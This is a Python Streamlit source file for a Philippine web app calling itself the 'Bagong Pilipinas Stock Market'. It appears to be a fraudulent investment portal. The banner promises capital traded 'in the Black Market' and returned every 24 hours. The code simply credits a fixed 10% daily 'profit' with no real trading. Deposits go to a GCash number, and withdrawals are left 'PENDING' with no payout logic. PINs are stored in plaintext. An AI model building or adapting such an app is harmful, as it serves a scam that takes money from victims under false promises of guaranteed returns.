import streamlit as st
import json
import os
from datetime import datetime, timedelta
import time

# --- 1. CORE DATA ENGINE ---
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_user(name, pin):
    reg = load_registry()
    if name in reg: return False
    reg[name] = {"pin": pin, "wallet": 0.0, "inv": [], "tx": []}
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)
    return True

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)

# --- 2. THE DESIGN (NO LEAKS, FULL MOBILE WIDTH) ---
st.set_page_config(page_title="BPSM Official", layout="wide")

st.markdown("""
    <style>
    /* CRITICAL: HIDES ALL SOURCE CODE AND SIDEBARS */
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }

    /* ADVERTISING BANNER */
    .banner {
        background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%);
        padding: 40px 20px;
        text-align: center;
        border-bottom: 3px solid #0dcf70;
        margin-bottom: 25px;
    }
    .banner h1 { font-family: 'Arial Black'; font-size: 2.2rem; color: white; margin: 0; line-height: 1; }
    .banner p { font-size: 0.9rem; color: #ffffff; margin-top: 15px; font-weight: bold; line-height: 1.4; }

    /* MOBILE INPUTS (BLACK TEXT / NO ZOOM) */
    .id-label { font-size: 0.9rem; color: #8c8f99; font-weight: bold; margin-left: 15px; margin-bottom: 5px; display: block; }
    .stTextInput input, .stNumberInput input {
        color: #000000 !important; 
        -webkit-text-fill-color: #000000 !important;
        background-color: #ffffff !important;
        border-radius: 12px !important;
        height: 4rem !important;
        font-size: 16px !important;
        font-weight: bold !important;
        margin: 0 15px;
    }

    /* BUTTONS */
    .stButton>button {
        width: 92% !important; margin: 15px auto !important; display: block !important;
        height: 4.5rem !important; border-radius: 15px !important;
        background: #0dcf70 !important; color: #0b0c0e !important;
        font-size: 1.4rem !important; font-weight: 900 !important; border: none !important;
    }

    /* CARDS */
    .trade-card {
        background-color: #17181c; padding: 15px; border-radius: 15px;
        border: 1px solid #2a2b30; margin: 10px;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LOGIN & BANNER ---
if 'user' not in st.session_state:
    st.session_state.user = None

if st.session_state.user is None:
    # THE BIG BANNER
    st.markdown("""
        <div class="banner">
            <h1>BAGONG PILIPINAS<br>STOCK MARKET</h1>
            <p>Every single capital is used to buy and sell commodities in the Black Market to return to you every 24 hours. Helping Capitalistas gain through Bagong Pilipinas.</p>
        </div>
    """, unsafe_allow_html=True)
    
    tab_log, tab_reg = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    
    with tab_log:
        st.markdown("<span class='id-label'>INVESTOR FULL NAME</span>", unsafe_allow_html=True)
        ln = st.text_input("ln", label_visibility="collapsed", key="login_name").upper()
        st.markdown("<span class='id-label'>6-DIGIT PIN</span>", unsafe_allow_html=True)
        lp = st.text_input("lp", type="password", max_chars=6, label_visibility="collapsed", key="login_pin")
        
        if st.button("VERIFY & ENTER PORTAL"):
            reg = load_registry()
            if ln in reg and reg[ln]['pin'] == lp:
                st.session_state.user = ln
                st.rerun()
            else: st.error("Verification Failed.")

    with tab_reg:
        rn = st.text_input("FULL NAME (REGISTER)", key="reg_name").upper()
        rp = st.text_input("SET PIN (6 DIGITS)", type="password", max_chars=6, key="reg_pin")
        if st.button("CREATE INVESTOR I.D."):
            if rn and len(rp) == 6:
                if save_user(rn, rp): st.success("Success! Go to Sign-In.")
                else: st.error("Name already exists.")

# --- 4. DASHBOARD ---
else:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    # Process Profits
    matured = 0
    active = []
    for i in data['inv']:
        if now >= datetime.fromisoformat(i['end']): matured += (i['amt'] + i['prof'])
        else: active.append(i)
    
    if matured > 0:
        data['wallet'] += matured
        data['inv'] = active
        update_user(name, data)

    st.markdown(f"<h2 style='text-align:center;'>{name}</h2>", unsafe_allow_html=True)
    
    st.markdown(f"""
        <div style="background:#17181c; padding:20px; border-radius:15px; text-align:center; border:1px solid #2a2b30; margin:10px;">
            <p style="color:#8c8f99; margin:0; font-size:0.8rem;">TOTAL ASSETS</p>
            <h1 style="color:#0dcf70; margin:0; font-size:2.5rem;">₱{data['wallet']:,.2f}</h1>
        </div>
    """, unsafe_allow_html=True)

    t_inv, t_wal, t_act = st.tabs(["📊 INVEST", "💳 WALLET", "📋 ACTIVE"])

    with t_inv:
        st.write("### 24H Commodity Trading")
        inv_a = st.number_input("Amount", min_value=100.0, step=100.0)
        if st.button("EXECUTE TRADE"):
            if data['wallet'] >= inv_a:
                data['wallet'] -= inv_a
                data['inv'].append({"amt": inv_a, "prof": inv_a*0.1, "end": (now + timedelta(hours=24)).isoformat()})
                update_user(name, data)
                st.rerun()
            else: st.error("Insufficient Funds.")

    with t_wal:
        mode = st.radio("Type", ["Deposit", "Withdraw"], horizontal=True)
        if mode == "Deposit":
            st.write("Deposit to GCash: **0912-345-6789**")
            d_amt = st.number_input("Deposit PHP", min_value=100.0)
            ref = st.text_input("Ref Number")
            if st.button("SEND REPORT"):
                data['tx'].append({"type": "DEP", "amt": d_amt, "ref": ref, "status": "PENDING"})
                update_user(name, data)
                st.success("Pending Approval.")
        else:
            w_amt = st.number_input("Withdraw PHP", min_value=100.0)
            if st.button("REQUEST CASH"):
                if data['wallet'] >= w_amt:
                    data['wallet'] -= w_amt
                    data['tx'].append({"type": "WD", "amt": w_amt, "status": "PENDING"})
                    update_user(name, data)
                    st.warning("Request Sent.")

    with t_act:
        if not active: st.write("No active market positions.")
        for t in active:
            rem = datetime.fromisoformat(t['end']) - now
            st.markdown(f"""
                <div class="trade-card">
                    <b>Capital:</b> ₱{t['amt']:,} | <b>Profit:</b> +₱{t['prof']:,}<br>
                    <b>Time Remaining:</b> {str(rem).split(".")[0]}
                </div>
            """, unsafe_allow_html=True)

    if st.sidebar.button("LOGOUT"):
        st.session_state.user = None
        st.rerun()

    time.sleep(10)
    st.rerun()
